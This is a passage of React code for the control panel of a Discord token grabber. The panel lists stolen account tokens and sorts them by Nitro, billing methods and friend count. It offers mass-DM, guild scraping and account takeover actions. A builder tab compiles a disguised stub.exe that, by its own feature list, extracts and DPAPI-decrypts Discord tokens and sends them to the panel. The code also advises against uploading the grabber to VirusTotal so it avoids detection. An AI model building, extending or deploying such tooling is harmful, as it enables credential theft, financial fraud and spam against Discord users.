                   else handleImport(e, 'txt');
                }} />
            </label>
            <button 
              onClick={() => setShowExportModal(true)}
              className="px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-md flex items-center gap-2 transition-colors font-medium text-xs"
            >
              <FileDown className="w-4 h-4" /> Export
            </button>
            <button 
              onClick={verifyAllTokens}
              className="px-3 py-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-md flex items-center gap-2 transition-colors font-medium text-xs"
            >
              <RefreshCw className="w-4 h-4" /> Verify
            </button>
            <button 
              onClick={() => setShowAddModal(true)}
              className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-md flex items-center gap-2 transition-colors font-medium text-sm shadow-lg shadow-indigo-600/30"
            >
              <Key className="w-4 h-4" /> Add Token
            </button>
          </div>
        </header>

        <h2 className="text-xl font-semibold mb-4 flex items-center gap-2">
          Valid Tokens <span className="bg-gray-800 px-2 rounded-full text-sm text-gray-400">{accounts.length}</span>
          {(() => {
            const nitroCount = accounts.filter(a => a.nitro).length;
            const billingCount = accounts.filter(a => a.billing?.length > 0).length;
            const onlineCount = accounts.filter(a => a.status === 'online').length;
            return (
              <span className="ml-auto flex gap-3 text-xs text-gray-500 font-mono">
                <span title="Nitro" className="flex items-center gap-1"><span className="w-2 h-2 rounded-full bg-pink-500"/>{nitroCount} nitro</span>
                <span title="Has Billing" className="flex items-center gap-1"><CreditCard className="w-3 h-3 text-indigo-400"/>{billingCount} billing</span>
                <span title="Online" className="flex items-center gap-1"><span className="w-2 h-2 rounded-full bg-green-500"/>{onlineCount} online</span>
                <span title="Filtered" className="flex items-center gap-1 text-indigo-300">Showing {filteredAccounts.length}</span>
              </span>
            );
          })()}
        </h2>

        <div className="mb-4 flex gap-2 items-center flex-wrap">
          <div className="flex items-center bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 flex-1 min-w-[200px]">
            <Search className="w-4 h-4 text-gray-500 mr-2 shrink-0" />
            <input
              type="text"
              placeholder="Search username, user ID..."
              className="bg-transparent border-none outline-none text-gray-300 w-full text-sm"
              value={search}
              onChange={e => setSearch(e.target.value)}
            />
            {search && <button onClick={() => setSearch('')} className="text-gray-500 hover:text-gray-300 ml-2"><X className="w-3.5 h-3.5"/></button>}
          </div>

          <button
            onClick={() => setShowFilters(f => !f)}
            className={`px-3 py-2 rounded-lg border text-sm font-medium flex items-center gap-2 transition-colors ${
              showFilters || filterBilling !== null || filterNitro !== null || filterStatus !== null || minFriends || minGuilds
                ? 'bg-indigo-600 border-indigo-500 text-white'
                : 'bg-gray-800 border-gray-700 text-gray-400 hover:text-gray-200'
            }`}
          >
            <Settings className="w-4 h-4"/> Filters
          </button>

          <select
            value={sortBy}
            onChange={e => setSortBy(e.target.value)}
            className="bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
          >
            <option value="default">Sort: Default</option>
            <option value="friends_desc">Most Friends</option>
            <option value="guilds_desc">Most Guilds</option>
            <option value="billing_desc">Most Billing</option>
            <option value="nitro_first">Nitro First</option>
            <option value="online_first">Online First</option>
            <option value="username_asc">Username A→Z</option>
          </select>
        </div>

        {showFilters && (
          <div className="mb-5 bg-gray-800/60 border border-gray-700 rounded-xl p-4 flex flex-wrap gap-4 items-end">
            <div>
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Billing</label>
              <div className="flex gap-1">
                {[['All', null], ['Has', true], ['None', false]].map(([label, val]) => (
                  <button key={label} onClick={() => setFilterBilling(val)}
                    className={`px-2.5 py-1 rounded text-xs font-semibold transition ${filterBilling === val ? 'bg-indigo-600 text-white' : 'bg-gray-700 text-gray-400 hover:bg-gray-600'}`}>
                    {label}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Nitro</label>
              <div className="flex gap-1">
                {[['All', null], ['Yes', true], ['No', false]].map(([label, val]) => (
                  <button key={label} onClick={() => setFilterNitro(val)}
                    className={`px-2.5 py-1 rounded text-xs font-semibold transition ${filterNitro === val ? 'bg-pink-600 text-white' : 'bg-gray-700 text-gray-400 hover:bg-gray-600'}`}>
                    {label}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Status</label>
              <div className="flex gap-1">
                {[['All', null], ['Online', 'online'], ['Idle', 'idle'], ['DND', 'dnd'], ['Invis', 'invisible']].map(([label, val]) => (
                  <button key={label} onClick={() => setFilterStatus(val)}
                    className={`px-2.5 py-1 rounded text-xs font-semibold transition ${filterStatus === val ? 'bg-indigo-600 text-white' : 'bg-gray-700 text-gray-400 hover:bg-gray-600'}`}>
                    {label}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Owns Guilds</label>
              <div className="flex gap-1">
                {[['All', null], ['Yes', true], ['No', false]].map(([label, val]) => (
                  <button key={label} onClick={() => setFilterOwnsGuilds(val)}
                    className={`px-2.5 py-1 rounded text-xs font-semibold transition ${filterOwnsGuilds === val ? 'bg-pink-600 text-white' : 'bg-gray-700 text-gray-400 hover:bg-gray-600'}`}>
                    {label}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Min Friends</label>
              <input type="number" min="0" placeholder="0" value={minFriends} onChange={e => setMinFriends(e.target.value)}
                className="w-20 bg-gray-700 border border-gray-600 rounded px-2 py-1 text-xs text-gray-300 focus:outline-none focus:border-indigo-500"/>
            </div>
            <div>
              <label className="text-[10px] text-gray-400 uppercase font-semibold block mb-1">Min Guilds</label>
              <input type="number" min="0" placeholder="0" value={minGuilds} onChange={e => setMinGuilds(e.target.value)}
                className="w-20 bg-gray-700 border border-gray-600 rounded px-2 py-1 text-xs text-gray-300 focus:outline-none focus:border-indigo-500"/>
            </div>
            <button onClick={() => { setFilterBilling(null); setFilterNitro(null); setFilterStatus(null); setFilterOwnsGuilds(null); setMinFriends(''); setMinGuilds(''); setSearch(''); }}
              className="px-3 py-1 bg-gray-700 hover:bg-gray-600 text-gray-400 hover:text-white rounded text-xs font-semibold ml-auto">
              Clear All
            </button>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
          {filteredAccounts.map(acc => (
            <div 
              key={acc.id} 
              onContextMenu={(e) => handleContextMenu(e, acc)}
              onClick={() => openWindow(acc)}
              className="bg-gray-800 border border-gray-700 rounded-xl p-4 hover:border-indigo-500 cursor-pointer transition-all hover:shadow-lg hover:shadow-indigo-900/20 group relative"
            >
              <div className={`absolute top-3 right-3 z-10 ${selectedTokens.includes(acc.id) ? 'visible' : 'invisible group-hover:visible'}`} onClick={e => e.stopPropagation()}>
                <input type="checkbox" checked={selectedTokens.includes(acc.id)} onChange={(e) => {
                    if(e.target.checked) setSelectedTokens([...selectedTokens, acc.id]);
                    else setSelectedTokens(selectedTokens.filter(id => id !== acc.id));
                }} className="w-4 h-4 cursor-pointer accent-indigo-500" />
              </div>
              <div className="flex items-center gap-4 mb-3 mt-1">
                <div className="relative">
                  <img 
                    src={acc.avatar ? `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png'} 
                    className="w-12 h-12 rounded-full ring-2 ring-gray-700 group-hover:ring-indigo-500"
                    alt="" 
                  />
                  <div className={`absolute -bottom-1 -right-1 w-4 h-4 rounded-full border-2 border-gray-800 ${
                    !acc.valid ? 'bg-red-500' :
                    acc.status === 'online' ? 'bg-green-500' :
                    acc.status === 'idle' ? 'bg-yellow-500' :
                    acc.status === 'dnd' ? 'bg-red-500' : 'bg-gray-500'
                  }`} />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-100">{acc.username} {acc.nitro && <span className="text-[10px] bg-pink-900/60 text-pink-300 px-1 py-0.5 rounded uppercase">Nitro</span>}</h3>
                  <p className="text-xs text-gray-400">{acc.id}</p>
                </div>
              </div>

              <div className="flex items-center gap-3 mt-4 text-xs font-mono text-gray-500">
                <span className="flex items-center gap-1.5" title="Friends"><Users className="w-3.5 h-3.5"/> {acc.friends?.length || 0}</span>
                <span className="flex items-center gap-1.5" title="Guilds"><Server className="w-3.5 h-3.5 text-gray-400"/> {acc.guilds?.length || 0}</span>
                <span className="flex items-center gap-1.5 text-pink-400/80" title="Owned Guilds"><Server className="w-3.5 h-3.5 text-pink-500"/> {acc.guilds?.filter(g => g.owner).length || 0}</span>
                <span className="flex items-center gap-1.5 text-indigo-400/80" title="Billing Methods">
                  <CreditCard className="w-3.5 h-3.5 text-indigo-500"/> {acc.billing?.length || 0}
                </span>
                <span className="flex items-center ml-auto">
                  <button 
                    onClick={(e) => { e.stopPropagation(); navigator.clipboard.writeText(acc.token); setToast({type: 'success', msg: 'Copied to clipboard'}); }}
                    className="text-gray-400 hover:text-indigo-400 ml-2" title="Copy Token"
                  >
                    <Copy className="w-4 h-4" />
                  </button>
                  <button 
                    onClick={(e) => { e.stopPropagation(); removeAccount(acc.id); }}
                    className="text-red-400 hover:text-red-300 ml-2 text-right"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </span>
              </div>
            </div>
          ))}
        </div>
        </div>
        )}

        {activeTab === 'config' && (
        <div className="max-w-7xl mx-auto">
            <header className="mb-8 flex justify-between items-center border-b border-gray-800 pb-4">
              <div className="flex items-center gap-3">
                <Cog className="w-8 h-8 text-indigo-500" />
                <h1 className="text-2xl font-bold tracking-tight text-white">Configuration</h1>
              </div>
            </header>
            
            <div className="space-y-6">
                <div className="bg-gray-800 border border-gray-700 rounded-xl shadow-xl overflow-hidden">
                    <div className="p-6">
                        <div className="flex items-center justify-between mb-4">
                            <h3 className="text-lg font-medium text-white flex items-center gap-2">
                                <Link className="w-5 h-5 text-indigo-400" /> Webhook Notifications
                            </h3>
                            <button
                                onClick={() => setWebhookNotificationsEnabled(!webhookNotificationsEnabled)}
                                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors duration-300 focus:outline-none ${
                                    webhookNotificationsEnabled ? 'bg-indigo-600' : 'bg-gray-600'
                                }`}
                            >
                                <span
                                    className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform duration-300 ${
                                        webhookNotificationsEnabled ? 'translate-x-6' : 'translate-x-1'
                                    }`}
                                />
                            </button>
                        </div>
                        
                        <div className={`transition-all duration-500 ease-in-out overflow-hidden ${
                            webhookNotificationsEnabled ? 'max-h-96 opacity-100' : 'max-h-0 opacity-0'
                        }`}>
                            <div className="pt-4 space-y-4">
                                <div className="space-y-2">
                                    <label className="text-xs text-gray-400 uppercase font-semibold block">Discord Webhook URL</label>
                                    <div className="relative group">
                                        <input 
                                            type="text" 
                                            value={configWebhookUrl}
                                            onChange={(e) => setConfigWebhookUrl(e.target.value)}
                                            onFocus={() => setWebhookUrlBlurred(false)}
                                            onBlur={() => setWebhookUrlBlurred(true)}
                                            placeholder="https://discord.com/api/webhooks/..."
                                            className="w-full bg-gray-700/50 border border-gray-600/50 rounded-lg px-4 py-3 text-sm text-gray-300 placeholder-gray-500 focus:outline-none focus:border-indigo-500 focus:bg-gray-700/70 transition-all duration-200"
                                            style={{ filter: (configWebhookUrl && webhookUrlBlurred) ? 'blur(8px)' : 'none', WebkitFilter: (configWebhookUrl && webhookUrlBlurred) ? 'blur(8px)' : 'none' }}
                                        />
                                        {configWebhookUrl && webhookUrlBlurred && (
                                            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                                                <span className="text-xs text-indigo-400 font-medium bg-gray-800/80 px-3 py-1 rounded-full border border-indigo-500/30">
                                                    🔒 Click to reveal
                                                </span>
                                            </div>
                                        )}
                                    </div>
                                    <p className="text-xs text-gray-500 italic">Webhook URL is blurred for security. Click the field to reveal and edit.</p>
                                </div>
                                
                                <div className="bg-blue-900/20 border border-blue-600/50 rounded-xl p-4">
                                    <div className="flex items-center gap-3">
                                        <AlertOctagon className="w-5 h-5 text-blue-500 flex-shrink-0" />
                                        <div>
                                            <p className="text-blue-400 text-sm font-medium mb-1">Webhook Information</p>
                                            <p className="text-blue-300 text-xs">This webhook will be used for all notifications and captured data across the application.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div className="bg-gray-800 border border-gray-700 rounded-xl shadow-xl p-6">
                    <h3 className="text-lg font-medium text-white mb-4 flex items-center gap-2">
                        <RefreshCw className="w-5 h-5 text-indigo-400" /> Auto-Refresh
                    </h3>
                    
                    <div className="space-y-4">
                        <div>
                            <label className="text-xs text-gray-400 uppercase font-semibold block mb-2">Refresh Interval (minutes)</label>
                            <select 
                                value={autoRefreshInterval}
                                onChange={(e) => setAutoRefreshInterval(e.target.value)}
                                className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                            >
                                <option value="0">Disabled</option>
                                <option value="1">1 minute</option>
                                <option value="2">2 minutes</option>
                                <option value="5">5 minutes</option>
                                <option value="10">10 minutes</option>
                                <option value="15">15 minutes</option>
                                <option value="30">30 minutes</option>
                            </select>
                        </div>
                        
                        <div className="bg-gray-700/50 rounded-lg p-4">
                            <h4 className="text-indigo-400 font-medium mb-2">Current Status</h4>
                            <div className="flex items-center gap-2">
                                {autoRefreshInterval === '0' ? (
                                    <>
                                        <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
                                        <span className="text-gray-400 text-sm">Auto-refresh disabled</span>
                                    </>
                                ) : (
                                    <>
                                        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                                        <span className="text-green-400 text-sm">Refreshing every {autoRefreshInterval} minute(s)</span>
                                    </>
                                )}
                            </div>
                        </div>
                    </div>
                </div>

                <div className="bg-gray-800 border border-gray-700 rounded-xl shadow-xl p-6">
                    <button 
                        onClick={saveConfig}
                        className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 flex items-center justify-center gap-3 rounded-lg shadow-lg shadow-indigo-600/30 transition-all"
                    >
                        <Settings className="w-5 h-5"/> Save Settings
                    </button>
                </div>
            </div>
        </div>
        )}

        {activeTab === 'injections' && (
        <div className="max-w-7xl mx-auto">
            <header className="mb-8 flex justify-between items-center border-b border-gray-800 pb-4">
              <div className="flex items-center gap-3">
                <Syringe className="w-8 h-8 text-indigo-500" />
                <h1 className="text-2xl font-bold tracking-tight text-white">Discord Injections</h1>
              </div>
            </header>
            
            <div className="text-center py-16">
              <div className="inline-flex items-center justify-center w-20 h-20 bg-yellow-500/20 rounded-full mb-6">
                <Syringe className="w-10 h-10 text-yellow-500" />
              </div>
              <h2 className="text-2xl font-bold text-yellow-500 mb-4">Under Development</h2>
              <p className="text-gray-400 max-w-md mx-auto">
                The Discord injection system is currently under development. 
                This feature will be available in a future update.
              </p>
            </div>
        </div>
        )}

        {activeTab === 'builder' && (
        <div className="max-w-7xl mx-auto">
            <header className="mb-8 flex justify-between items-center border-b border-gray-800 pb-4">
              <div className="flex items-center gap-3">
                <Hammer className="w-8 h-8 text-indigo-500" />
                <h1 className="text-2xl font-bold tracking-tight text-white">Grabber Builder</h1>
              </div>
            </header>
            
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className={`bg-gray-800 border border-gray-700 rounded-xl shadow-xl overflow-hidden transition-all duration-500 ease-in-out ${
                    showAssemblyInfo ? 'max-h-[800px]' : 'max-h-[70px]'
                }`}>
                    <div className={`p-6 border-b border-gray-700 transition-all duration-500 ease-in-out ${
                        showAssemblyInfo ? 'pb-6' : 'pb-4'
                    }`}>
                        <div className="flex items-center justify-between -mt-3">
                            <h3 className="text-lg font-medium text-white flex items-center gap-2">
                                <Settings className="w-5 h-5 text-indigo-400" /> Assembly Information
                            </h3>
                            <button
                                onClick={() => setShowAssemblyInfo(!showAssemblyInfo)}
                                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors duration-300 focus:outline-none ${
                                    showAssemblyInfo ? 'bg-indigo-600' : 'bg-gray-600'
                                }`}
                            >
                                <span
                                    className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform duration-300 ${
                                        showAssemblyInfo ? 'translate-x-6' : 'translate-x-1'
                                    }`}
                                />
                            </button>
                        </div>
                    </div>
                    
                    <div className={`transition-all duration-500 ease-in-out ${
                        showAssemblyInfo ? 'opacity-100' : 'opacity-0 max-h-0 overflow-hidden'
                    }`}>
                        <div className="p-6 space-y-4">
                            <div>
                                <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">File Description</label>
                                <input 
                                    type="text" 
                                    value={assemblyInfo.file_description}
                                    onChange={(e) => setAssemblyInfo({...assemblyInfo, file_description: e.target.value})}
                                    placeholder="Enter file description..."
                                    className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                />
                            </div>
                            <div>
                                <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">Product Name</label>
                                <input 
                                    type="text" 
                                    value={assemblyInfo.product_name}
                                    onChange={(e) => setAssemblyInfo({...assemblyInfo, product_name: e.target.value})}
                                    placeholder="Enter product name..."
                                    className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                />
                            </div>
                            <div className="grid grid-cols-2 gap-3">
                                <div>
                                    <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">File Version</label>
                                    <input 
                                        type="text" 
                                        value={assemblyInfo.file_version}
                                        onChange={(e) => setAssemblyInfo({...assemblyInfo, file_version: e.target.value})}
                                        className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                    />
                                </div>
                                <div>
                                    <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">Product Version</label>
                                    <input 
                                        type="text" 
                                        value={assemblyInfo.product_version}
                                        onChange={(e) => setAssemblyInfo({...assemblyInfo, product_version: e.target.value})}
                                        className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                    />
                                </div>
                            </div>
                            <div>
                                <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">Company Name</label>
                                <input 
                                    type="text" 
                                    value={assemblyInfo.company_name}
                                    onChange={(e) => setAssemblyInfo({...assemblyInfo, company_name: e.target.value})}
                                    placeholder="Enter company name..."
                                    className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                />
                            </div>
                            <div>
                                <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">Copyright</label>
                                <input 
                                    type="text" 
                                    value={assemblyInfo.legal_copyright}
                                    onChange={(e) => setAssemblyInfo({...assemblyInfo, legal_copyright: e.target.value})}
                                    placeholder="Enter copyright information..."
                                    className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                />
                            </div>
                            <div>
                                <label className="text-xs text-gray-400 uppercase font-semibold block mb-1">Original Filename</label>
                                <input 
                                    type="text" 
                                    value={assemblyInfo.original_filename}
                                    onChange={(e) => setAssemblyInfo({...assemblyInfo, original_filename: e.target.value})}
                                    className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:outline-none focus:border-indigo-500"
                                />
                            </div>
                        </div>
                    </div>
                </div>

                <div className="space-y-6">
                    <div className="bg-gray-800 border border-gray-700 rounded-xl p-6 shadow-xl">
                        <h3 className="text-lg font-medium text-white mb-4 flex items-center gap-2">
                            <FileDown className="w-5 h-5 text-indigo-400" /> Icon & Build
                        </h3>
                        
                        <div className="mb-6">
                            <label className="text-xs text-gray-400 uppercase font-semibold block mb-3">Executable Icon (.ICO)</label>
                            <div className="flex items-center gap-4">
                                <div className="relative">
                                    <input 
                                        type="file" 
                                        accept=".ico"
                                        onChange={handleIconUpload}
                                        className="hidden"
                                        id="icon-upload"
                                    />
                                    <label 
                                        htmlFor="icon-upload"
                                        className="cursor-pointer bg-gray-700 hover:bg-gray-600 border border-gray-600 rounded-lg px-4 py-3 text-sm text-gray-300 flex items-center gap-2 transition-colors"
                                    >
                                        <FileUp className="w-4 h-4" />
                                        Choose Icon
                                    </label>
                                </div>
                                {iconPreview && (
                                    <div className="flex items-center gap-2 text-sm text-green-400">
                                        <CheckCircle className="w-4 h-4" />
                                        Icon selected
                                    </div>
                                )}
                            </div>
                            {iconPreview && (
                                <div className="mt-3 flex items-center gap-3">
                                    <img 
                                        src={`data:image/x-icon;base64,${iconPreview}`}
                                        alt="Icon preview" 
                                        className="w-12 h-12 border border-gray-600 rounded"
                                    />
                                    <span className="text-xs text-gray-400">Icon preview</span>
                                </div>
                            )}
                        </div>

                        <button 
                            onClick={compileAndDownloadExe} 
                            className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 flex items-center justify-center gap-3 rounded-lg shadow-lg shadow-indigo-600/30 transition-all"
                        >
                            <FileDown className="w-5 h-5"/> Compile & Download {assemblyInfo.original_filename || 'stub.exe'}
                        </button>
                    </div>

                    <div className="bg-gray-800 border border-gray-700 rounded-xl p-6 shadow-xl">
                        <h4 className="text-sm font-medium text-gray-300 mb-3">Features</h4>
                        <ul className="list-disc text-sm text-gray-400 pl-5 space-y-2">
                            <li>Extracts tokens from Discord, Discord Canary, and Discord PTB</li>
                            <li>Decrypts encrypted tokens using Windows DPAPI</li>
                            <li>Validates tokens via Discord API</li>
                            <li>Automatically registers valid tokens to this manager</li>
                            <li>Compiled as standalone executable (no dependencies)</li>
                            <li>Custom assembly information and icon support</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <div className="mt-8 bg-yellow-900/20 border border-yellow-600/50 rounded-xl p-4">
                <div className="flex items-center gap-3">
                    <AlertOctagon className="w-5 h-5 text-yellow-500 flex-shrink-0" />
                    <p className="text-yellow-400 text-sm font-medium">
                        Avoid uploading the grabber to websites like VirusTotal so it doesn't get flagged!
                    </p>
                </div>
            </div>
        </div>
        )}

      {toast && (
        <div className="fixed top-4 right-4 z-[99999] animate-pulse">
          <div className={`px-4 py-3 rounded-lg shadow-xl border flex items-center gap-3 min-w-[300px] ${
            toast.type === 'success' ? 'bg-green-600/20 border-green-600/50 text-green-400' : 
            toast.type === 'error' ? 'bg-red-600/20 border-red-600/50 text-red-400' : 
            'bg-blue-600/20 border-blue-600/50 text-blue-400'
          }`}>
            {toast.type === 'success' && <CheckCircle className="w-5 h-5" />}
            {toast.type === 'error' && <AlertOctagon className="w-5 h-5" />}
            {toast.type === 'info' && <Activity className="w-5 h-5" />}
            <span className="text-sm font-medium">{toast.msg}</span>
          </div>
        </div>
      )}

      {contextMenu && (
        <div 
          className="fixed bg-gray-800 border border-gray-700 rounded-md shadow-2xl py-1 text-xs text-gray-200 z-[9999] overflow-y-auto custom-scrollbar flex flex-col"
          style={{ 
            top: contextMenu.mouseY, 
            left: contextMenu.mouseX, 
            width: '200px', 
            maxHeight: '400px',
            transform: `translate(${contextMenu.mouseX + 200 > window.innerWidth ? '-100%' : '0'}, ${contextMenu.mouseY + 400 > window.innerHeight ? '-100%' : '0'})`
          }}
          onClick={(e) => e.stopPropagation()} 
        >
          {contextView === 'main' && (
            <>
              <div className="px-3 py-1 text-[10px] text-gray-500 font-semibold uppercase tracking-wider mb-1 border-b border-gray-700 pb-2 flex items-center justify-between">
                  <span className="flex items-center gap-2"><Settings className="w-3 h-3"/> Quick Actions</span>
                  <div className="flex gap-1.5 items-center">
                      <button title="Online" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'online'); setContextMenu(null);}} className="w-2.5 h-2.5 rounded-full bg-green-500 hover:scale-125 transition-transform"></button>
                      <button title="Idle" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'idle'); setContextMenu(null);}} className="w-2.5 h-2.5 rounded-full bg-yellow-500 hover:scale-125 transition-transform"></button>
                      <button title="Do Not Disturb" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'dnd'); setContextMenu(null);}} className="w-2.5 h-2.5 rounded-full bg-red-500 hover:scale-125 transition-transform"></button>
                      <button title="Invisible" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'invisible'); setContextMenu(null);}} className="w-2.5 h-2.5 rounded-full border border-gray-500 hover:scale-125 transition-transform"></button>
                  </div>
              </div>
              
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); navigator.clipboard.writeText(contextMenu.account.token); setToast({type: 'success', msg: 'Copied to clipboard'}); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center"><Copy className="w-3 h-3"/> Copy Token</span> 
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group border-b border-gray-700 pb-2 mb-1" onClick={(e) => { e.stopPropagation(); setContextView('theme'); }}>
                 <span className="flex gap-2 items-center"><Moon className="w-3 h-3"/> Themes</span> <span className="text-gray-500 text-xs text-right">&gt;</span>
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setContextView('language'); }}>
                 <span className="flex gap-2 items-center"><Globe className="w-3 h-3"/> Language</span> <span className="text-gray-500 text-xs text-right">&gt;</span>
              </div>
              
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group border-t border-gray-700 mt-1 pt-2" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'dev_mode', true); }}>
                 <span className="flex gap-2 items-center"><Monitor className="w-3 h-3"/> Dev Mode</span> <span className="text-green-400 text-xs">ON</span>
              </div>
              
              <div className="px-3 py-1 text-[10px] text-gray-500 font-semibold uppercase tracking-wider mb-1 border-b border-t border-gray-700 pb-2 flex items-center gap-2 mt-2 pt-2"><Users className="w-3 h-3"/> Managers</div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setRmWindow(contextMenu.account); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-indigo-400 font-medium"><Users className="w-4 h-4" /> Relationship Manager</span> 
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setGmWindow(contextMenu.account); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-indigo-400 font-medium"><Server className="w-4 h-4" /> Guild Manager</span> 
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setPcWindow(contextMenu.account); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-indigo-400 font-medium"><Settings className="w-4 h-4" /> Profile Manager</span> 
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setContextMenu(null); scrapeGuild(contextMenu.account.id); }}>
                 <span className="flex gap-2 items-center text-indigo-400 font-medium"><Search className="w-4 h-4" /> Guild Scraper</span> 
              </div>

              <div className="px-3 py-1 text-[10px] text-gray-500 font-semibold uppercase tracking-wider mb-1 border-b border-t border-gray-700 pb-2 mt-2 pt-2 flex items-center gap-2"><Activity className="w-3 h-3"/> Presences</div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex items-center justify-between group" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'online'); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-gray-200 text-xs font-medium"><span className="w-2.5 h-2.5 rounded-full bg-green-500 inline-block shrink-0"/><span>Online</span></span>
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex items-center justify-between group" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'idle'); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-gray-200 text-xs font-medium"><span className="w-2.5 h-2.5 rounded-full bg-yellow-500 inline-block shrink-0"/><span>Idle</span></span>
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex items-center justify-between group" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'dnd'); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-gray-200 text-xs font-medium"><span className="w-2.5 h-2.5 rounded-full bg-red-500 inline-block shrink-0"/><span>Do Not Disturb</span></span>
              </div>
              <div className="px-3 py-1.5 hover:bg-gray-700 cursor-pointer flex items-center justify-between group" onClick={(e) => { e.stopPropagation(); handleAction(contextMenu.accountId, 'status', 'invisible'); setContextMenu(null); }}>
                 <span className="flex gap-2 items-center text-gray-200 text-xs font-medium"><span className="w-2.5 h-2.5 rounded-full bg-gray-600 border border-gray-400 inline-block shrink-0"/><span>Invisible</span></span>
              </div>

              <div className="px-3 py-1 text-[10px] text-red-500 font-semibold uppercase tracking-wider mb-1 border-b border-t border-gray-700 pb-2 mt-2 pt-2 flex items-center gap-2"><AlertOctagon className="w-3 h-3"/> Danger</div>
              <div className="px-3 py-1.5 hover:bg-red-900/40 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setContextAccount(contextMenu.account); setContextMenu(null); setShowDmWarning(true); }}>
                 <span className="flex gap-2 items-center text-red-400 font-medium"><Users className="w-4 h-4" /> Mass DM Everyone</span> 
              </div>
              <div className="px-3 py-1.5 hover:bg-red-900/40 cursor-pointer flex justify-between group" onClick={(e) => { e.stopPropagation(); setContextAccount(contextMenu.account); setContextMenu(null); setCleanerWarning(true); }}>
